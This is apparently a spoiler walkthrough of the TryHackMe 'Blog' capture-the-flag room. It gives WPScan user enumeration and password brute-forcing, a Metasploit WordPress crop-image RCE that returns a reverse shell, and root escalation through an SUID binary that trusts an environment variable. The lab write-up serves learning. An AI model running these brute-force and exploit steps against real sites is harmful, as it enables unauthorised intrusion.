# Blog CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Blog** CTF challenge on [TryHackMe](https://tryhackme.com/room/blog). 
---

after scanning we found 4 open ports: 80, 139, 22,445

we know about WordPress from nmap scan

running feroxbuster scan

![ferox](imgs/ferox.png "ferox")

running WPScan to enumerate plugins and usernames  

```
wpscan --url http://10.10.X.X -v --enumerate vp,u --no-update
```

![users](imgs/users.png "users")

we found `bjoel` and `kwhell`

now we can try to brute force them

```
wpscan --url http://10.10.X.X -v --usernames kwheel --paswords /usr/share/wordlists/rockyou.txt --no-update
```

![pass](imgs/pass.png "pass")

and we found credentials

it worked we are logged in and we see dashboard

![dash](imgs/dash.png "dash")

after googling `wordpress 5.0 exploit` i found shell upload with `metasploit`

![cve](imgs/cve.png "cve")

```
msf6 > use exploit/multi/http/wp_crop_rce
msf6 > set RHOST blog.thm
msf6 > set USERNAME kwheel
msf6 > set PASSWORD c...
msf6 > set LHOST 10.14.X.X
msf6 > run
```

we got shell as `www-data`

![www](imgs/www.png "www")

we need to find user flag somewhere else

![user1](imgs/user1.png "user1")

after running linpeas we found unknown SUID file `/usr/sbin/checker`

![suid](imgs/suid.png "suid")

running the file

![checkerrun](imgs/checkerrun.png "checkerrun")


we need to analyise the file deeper, using strings doesnt give enough clue

after running 

```
ltrace /usr/sbin/checker 
```

we see that the checker file uses getenv("admin")

![ltrace](imgs/ltrace.png "ltrace")

i tried using `export admin=admin` and then running the script and it works

we got root shell 

![root](imgs/root.png "root")

now we need to find the flags

i used this find command 

```
sudo find / -type f -name "user.txt" 2>/dev/null

```

user flag is in `/media/usb/user.txt` and root flag in `/root/root.txt`

![flags](imgs/flags.png "flags")

# MACHINE PWNED
